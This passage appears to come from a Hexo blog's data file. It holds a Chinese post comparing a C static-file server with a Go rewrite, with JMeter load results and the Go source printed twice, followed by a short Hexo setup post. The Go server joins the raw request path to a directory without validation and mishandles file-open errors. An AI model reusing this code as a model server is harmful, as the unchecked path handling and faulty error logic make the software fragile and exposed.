class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">\t<span class=\"string\">\"flag\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"fmt\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"io/ioutil\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"log\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"net/http\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"os\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"os/exec\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"path/filepath\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"strings\"</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> realPath <span class=\"keyword\">string</span> <span class=\"comment\">//当前程序运行目录</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span><br><span class=\"line\">www路由，请求处理 w:response  r:request</span><br><span class=\"line\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">staticResource</span><span class=\"params\">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class=\"line\">\tfmt.Println(<span class=\"string\">\"url:\"</span> + r.RequestURI)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> r.Method == <span class=\"string\">\"get\"</span> || r.Method == <span class=\"string\">\"GET\"</span> &#123;</span><br><span class=\"line\">\t\tdisposeGet(w, r)</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> r.Method == <span class=\"string\">\"post\"</span> || r.Method == <span class=\"string\">\"POST\"</span> &#123;</span><br><span class=\"line\">\t\tdisposePost(w, r)</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\tw.WriteHeader(<span class=\"number\">501</span>)</span><br><span class=\"line\">\t\tw.Write([]<span class=\"keyword\">byte</span>(<span class=\"string\">\"&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Method Not Implemented&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;P&gt;HTTP request method not supported.&lt;/BODY&gt;&lt;/HTML&gt;\"</span>))</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span><br><span class=\"line\">取字串 s:字符串 l:取到多少位</span><br><span class=\"line\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">substr</span><span class=\"params\">(s <span class=\"keyword\">string</span>, l <span class=\"keyword\">int</span>)</span> <span class=\"title\">string</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(s) &lt;= l &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> s</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tss, sl, rl, rs := <span class=\"string\">\"\"</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, []<span class=\"keyword\">rune</span>(s)</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> _, r := <span class=\"keyword\">range</span> rs &#123;</span><br><span class=\"line\">\t\trint := <span class=\"keyword\">int</span>(r)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> rint &lt; <span class=\"number\">128</span> &#123;</span><br><span class=\"line\">\t\t\trl = <span class=\"number\">1</span></span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\trl = <span class=\"number\">2</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> sl+rl &gt; l &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tsl += rl</span><br><span class=\"line\">\t\tss += <span class=\"keyword\">string</span>(r)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ss</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span><br><span class=\"line\">get获取静态资源 w: response r: request</span><br><span class=\"line\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">disposeGet</span><span class=\"params\">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class=\"line\">\trequest_type := r.URL.Path[strings.LastIndex(r.URL.Path, <span class=\"string\">\".\"</span>):]</span><br><span class=\"line\">\t<span class=\"keyword\">switch</span> request_type &#123; <span class=\"comment\">//文件类型判断</span></span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"string\">\".html\"</span>:</span><br><span class=\"line\">\t\tw.Header().Set(<span class=\"string\">\"content-type\"</span>, <span class=\"string\">\"text/html\"</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"string\">\".htm\"</span>:</span><br><span class=\"line\">\t\tw.Header().Set(<span class=\"string\">\"content-type\"</span>, <span class=\"string\">\"text/html\"</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"string\">\".css\"</span>:</span><br><span class=\"line\">\t\tw.Header().Set(<span class=\"string\">\"content-type\"</span>, <span class=\"string\">\"text/css\"</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"string\">\".js\"</span>:</span><br><span class=\"line\">\t\tw.Header().Set(<span class=\"string\">\"content-type\"</span>, <span class=\"string\">\"text/javascript\"</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"string\">\".png\"</span>:</span><br><span class=\"line\">\t\tw.Header().Set(<span class=\"string\">\"content-type\"</span>, <span class=\"string\">\"image/png\"</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"string\">\".gif\"</span>:</span><br><span class=\"line\">\t\tw.Header().Set(<span class=\"string\">\"content-type\"</span>, <span class=\"string\">\"image/gif\"</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"string\">\".jpg\"</span>:</span><br><span class=\"line\">\t\tw.Header().Set(<span class=\"string\">\"content-type\"</span>, <span class=\"string\">\"image/jpeg\"</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfin, err := os.Open(realPath + r.URL.Path)</span><br><span class=\"line\">\t<span class=\"keyword\">defer</span> fin.Close()</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123; <span class=\"comment\">//未找到静态资源文件</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> request_type == <span class=\"string\">\".html\"</span> || request_type == <span class=\"string\">\".htm\"</span> &#123; <span class=\"comment\">//未找到html文件</span></span><br><span class=\"line\">\t\t\tw.WriteHeader(<span class=\"number\">404</span>)</span><br><span class=\"line\">\t\t\tfmt.Println(<span class=\"string\">\"static resource:\"</span>, err)</span><br><span class=\"line\">\t\t\tw.Write([]<span class=\"keyword\">byte</span>(<span class=\"string\">\"&lt;HTML&gt;&lt;TITLE&gt;Not Found&lt;/TITLE&gt;&lt;BODY&gt;&lt;P&gt;The server could not fulfill.your request be.is unavailable or nonexistent.&lt;/BODY&gt;&lt;/HTML&gt;\"</span>))</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfd, _ := ioutil.ReadAll(fin)</span><br><span class=\"line\">\tw.Write(fd)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span><br><span class=\"line\">post上传静态资源 w: response r: request</span><br><span class=\"line\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">disposePost</span><span class=\"params\">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"comment\">//未实现</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span><br><span class=\"line\">程序入口</span><br><span class=\"line\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"comment\">//获取程序当前路径</span></span><br><span class=\"line\">\tfile, _ := exec.LookPath(os.Args[<span class=\"number\">0</span>])</span><br><span class=\"line\">\tpath, _ := filepath.Abs(file)</span><br><span class=\"line\">\t<span class=\"comment\">//命令行参数处理</span></span><br><span class=\"line\">\targ_num := <span class=\"built_in\">len</span>(os.Args)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> arg_num == <span class=\"number\">2</span> &#123;</span><br><span class=\"line\">\t\tport := os.Args[<span class=\"number\">1</span>] <span class=\"comment\">//第一个参数为端口号</span></span><br><span class=\"line\">\t\tfmt.Println(<span class=\"string\">\"http server start port:\"</span> + port)</span><br><span class=\"line\">\t\t<span class=\"comment\">//取前当前目录</span></span><br><span class=\"line\">\t\trealPath = substr(path, strings.LastIndex(path, <span class=\"string\">\"\\\\\"</span>))</span><br><span class=\"line\">\t\tflag.Parse()</span><br><span class=\"line\">\t\t<span class=\"comment\">//请求处理</span></span><br><span class=\"line\">\t\thttp.HandleFunc(<span class=\"string\">\"/www/\"</span>, staticResource)</span><br><span class=\"line\">\t\terr := http.ListenAndServe(<span class=\"string\">\":\"</span>+port, <span class=\"literal\">nil</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t\tlog.Fatal(<span class=\"string\">\"服务器出错:\"</span>, err)</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\tfmt.Println(<span class=\"string\">\"参数错误，程序退出\"</span>)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","excerpt":"<p>周末有人介绍golang很合适后端开发，随即把之前C实现的静态资源下载功能(读取服务器上的静态资源文件内容返回给客户端)改成golang实现。然后对比一下效果。</p>\n<h2 id=\"实现对比\"><a href=\"#实现对比\" class=\"headerlink\" title=\"实现对比\"></a>实现对比</h2><p>同样使用标准库,golang实现代码+注释只需要123行,C实现代码+注释412行，golang代码量只有C的1/3。</p>\n<h2 id=\"测试对比\"><a href=\"#测试对比\" class=\"headerlink\" title=\"测试对比\"></a>测试对比</h2><p>我使用的是jmeter测试，首先测试c实现的服务,分别用100,200,300线程并发，每线程访问10。测试数据如下:<br><img src=\"/img/go-1.png\" alt=\"c\"></p>\n<p><img src=\"/img/go-2.png\" alt=\"c\"></p>\n<p><img src=\"/img/go-3.png\" alt=\"c\"><br>C版实现越测数据越看不下去了，出错率越来越大。接着我测golang实现，我分别用300线程，1000线程和5000线程并发，每线程访问10次。测试数据如下:<br><img src=\"/img/go-4.png\" alt=\"c\"></p>\n<p><img src=\"/img/go-5.png\" alt=\"c\"></p>\n<p><img src=\"/img/go-6.png\" alt=\"c\"><br>除了响应时间延长，其它都比较稳定，出错率全为0.难道这是传说中的后端神器，难道老板再也不用担心网站访问人数太多当机了，难道我也转golang开发。<br>","more":"</p>\n<h2 id=\"golang实现\"><a href=\"#golang实现\" class=\"headerlink\" title=\"golang实现\"></a>golang实现</h2><figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">\t<span class=\"string\">\"flag\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"fmt\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"io/ioutil\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"log\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"net/http\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"os\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"os/exec\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"path/filepath\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"strings\"</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> realPath <span class=\"keyword\">string</span> <span class=\"comment\">//当前程序运行目录</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span><br><span class=\"line\">www路由，请求处理 w:response  r:request</span><br><span class=\"line\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">staticResource</span><span class=\"params\">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class=\"line\">\tfmt.Println(<span class=\"string\">\"url:\"</span> + r.RequestURI)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> r.Method == <span class=\"string\">\"get\"</span> || r.Method == <span class=\"string\">\"GET\"</span> &#123;</span><br><span class=\"line\">\t\tdisposeGet(w, r)</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> r.Method == <span class=\"string\">\"post\"</span> || r.Method == <span class=\"string\">\"POST\"</span> &#123;</span><br><span class=\"line\">\t\tdisposePost(w, r)</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\tw.WriteHeader(<span class=\"number\">501</span>)</span><br><span class=\"line\">\t\tw.Write([]<span class=\"keyword\">byte</span>(<span class=\"string\">\"&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Method Not Implemented&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;P&gt;HTTP request method not supported.&lt;/BODY&gt;&lt;/HTML&gt;\"</span>))</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span><br><span class=\"line\">取字串 s:字符串 l:取到多少位</span><br><span class=\"line\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">substr</span><span class=\"params\">(s <span class=\"keyword\">string</span>, l <span class=\"keyword\">int</span>)</span> <span class=\"title\">string</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(s) &lt;= l &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> s</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tss, sl, rl, rs := <span class=\"string\">\"\"</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, []<span class=\"keyword\">rune</span>(s)</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> _, r := <span class=\"keyword\">range</span> rs &#123;</span><br><span class=\"line\">\t\trint := <span class=\"keyword\">int</span>(r)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> rint &lt; <span class=\"number\">128</span> &#123;</span><br><span class=\"line\">\t\t\trl = <span class=\"number\">1</span></span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\trl = <span class=\"number\">2</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> sl+rl &gt; l &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tsl += rl</span><br><span class=\"line\">\t\tss += <span class=\"keyword\">string</span>(r)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ss</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span><br><span class=\"line\">get获取静态资源 w: response r: request</span><br><span class=\"line\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">disposeGet</span><span class=\"params\">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class=\"line\">\trequest_type := r.URL.Path[strings.LastIndex(r.URL.Path, <span class=\"string\">\".\"</span>):]</span><br><span class=\"line\">\t<span class=\"keyword\">switch</span> request_type &#123; <span class=\"comment\">//文件类型判断</span></span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"string\">\".html\"</span>:</span><br><span class=\"line\">\t\tw.Header().Set(<span class=\"string\">\"content-type\"</span>, <span class=\"string\">\"text/html\"</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"string\">\".htm\"</span>:</span><br><span class=\"line\">\t\tw.Header().Set(<span class=\"string\">\"content-type\"</span>, <span class=\"string\">\"text/html\"</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"string\">\".css\"</span>:</span><br><span class=\"line\">\t\tw.Header().Set(<span class=\"string\">\"content-type\"</span>, <span class=\"string\">\"text/css\"</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"string\">\".js\"</span>:</span><br><span class=\"line\">\t\tw.Header().Set(<span class=\"string\">\"content-type\"</span>, <span class=\"string\">\"text/javascript\"</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"string\">\".png\"</span>:</span><br><span class=\"line\">\t\tw.Header().Set(<span class=\"string\">\"content-type\"</span>, <span class=\"string\">\"image/png\"</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"string\">\".gif\"</span>:</span><br><span class=\"line\">\t\tw.Header().Set(<span class=\"string\">\"content-type\"</span>, <span class=\"string\">\"image/gif\"</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"string\">\".jpg\"</span>:</span><br><span class=\"line\">\t\tw.Header().Set(<span class=\"string\">\"content-type\"</span>, <span class=\"string\">\"image/jpeg\"</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfin, err := os.Open(realPath + r.URL.Path)</span><br><span class=\"line\">\t<span class=\"keyword\">defer</span> fin.Close()</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123; <span class=\"comment\">//未找到静态资源文件</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> request_type == <span class=\"string\">\".html\"</span> || request_type == <span class=\"string\">\".htm\"</span> &#123; <span class=\"comment\">//未找到html文件</span></span><br><span class=\"line\">\t\t\tw.WriteHeader(<span class=\"number\">404</span>)</span><br><span class=\"line\">\t\t\tfmt.Println(<span class=\"string\">\"static resource:\"</span>, err)</span><br><span class=\"line\">\t\t\tw.Write([]<span class=\"keyword\">byte</span>(<span class=\"string\">\"&lt;HTML&gt;&lt;TITLE&gt;Not Found&lt;/TITLE&gt;&lt;BODY&gt;&lt;P&gt;The server could not fulfill.your request be.is unavailable or nonexistent.&lt;/BODY&gt;&lt;/HTML&gt;\"</span>))</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfd, _ := ioutil.ReadAll(fin)</span><br><span class=\"line\">\tw.Write(fd)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span><br><span class=\"line\">post上传静态资源 w: response r: request</span><br><span class=\"line\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">disposePost</span><span class=\"params\">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"comment\">//未实现</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span><br><span class=\"line\">程序入口</span><br><span class=\"line\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"comment\">//获取程序当前路径</span></span><br><span class=\"line\">\tfile, _ := exec.LookPath(os.Args[<span class=\"number\">0</span>])</span><br><span class=\"line\">\tpath, _ := filepath.Abs(file)</span><br><span class=\"line\">\t<span class=\"comment\">//命令行参数处理</span></span><br><span class=\"line\">\targ_num := <span class=\"built_in\">len</span>(os.Args)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> arg_num == <span class=\"number\">2</span> &#123;</span><br><span class=\"line\">\t\tport := os.Args[<span class=\"number\">1</span>] <span class=\"comment\">//第一个参数为端口号</span></span><br><span class=\"line\">\t\tfmt.Println(<span class=\"string\">\"http server start port:\"</span> + port)</span><br><span class=\"line\">\t\t<span class=\"comment\">//取前当前目录</span></span><br><span class=\"line\">\t\trealPath = substr(path, strings.LastIndex(path, <span class=\"string\">\"\\\\\"</span>))</span><br><span class=\"line\">\t\tflag.Parse()</span><br><span class=\"line\">\t\t<span class=\"comment\">//请求处理</span></span><br><span class=\"line\">\t\thttp.HandleFunc(<span class=\"string\">\"/www/\"</span>, staticResource)</span><br><span class=\"line\">\t\terr := http.ListenAndServe(<span class=\"string\">\":\"</span>+port, <span class=\"literal\">nil</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t\tlog.Fatal(<span class=\"string\">\"服务器出错:\"</span>, err)</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\tfmt.Println(<span class=\"string\">\"参数错误，程序退出\"</span>)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"如何用hexo上做个blog站点","date":"2016-01-01T16:00:00.000Z","desc":"hexo blog","_content":"2016年起，我要写博客了!各种博客网站都不合我意，最后用hexo+github搭了一个博客网站，全免费，还可以把开源项目放在里面，关键完全可以自己控制，入门虽然有一点难度，但是熟习以后使用起来其实相当简单. [了解关于hexo更多信息](http://hexo.io/docs/). [hexo常见问题](http://hexo.io/docs/troubleshooting.html) 你也可以在[GitHub](https://github.com/hexojs/hexo/issues)上提问.\n\n## 开启\n\n### 创建新blog\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](http://hexo.io/docs/writing.html)\n<!-- more -->\n### 启动web服务器\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](http://hexo.io/docs/server.html)\n\n### 生成静态文件\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](http://hexo.io/docs/generating.html)\n\n### 发布站点\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](http://hexo.io/docs/deployment.html)\n\n\n一切看上去就是那么简单。但是用hexo做博客网站，你还需要懂一点nodejs,markdown语法，如果你想把网站放到github上，你还需要了解点git shell。\n\n","source":"_posts/hello-world.md","raw":"---\ntitle: 如何用hexo上做个blog站点\ndate: 2016-1-2\ndesc: hexo blog\n---\n2016年起，我要写博客了!各种博客网站都不合我意，最后用hexo+github搭了一个博客网站，全免费，还可以把开源项目放在里面，关键完全可以自己控制，入门虽然有一点难度，但是熟习以后使用起来其实相当简单. [了解关于hexo更多信息](http://hexo.io/docs/). [hexo常见问题](http://hexo.io/docs/troubleshooting.html) 你也可以在[GitHub](https://github.com/hexojs/hexo/issues)上提问.\n\n## 开启\n\n### 创建新blog\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](http://hexo.io/docs/writing.html)\n<!-- more -->\n### 启动web服务器\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](http://hexo.io/docs/server.html)\n\n### 生成静态文件\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](http://hexo.io/docs/generating.html)\n\n### 发布站点\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](http://hexo.io/docs/deployment.html)\n\n\n一切看上去就是那么简单。但是用hexo做博客网站，你还需要懂一点nodejs,markdown语法，如果你想把网站放到github上，你还需要了解点git 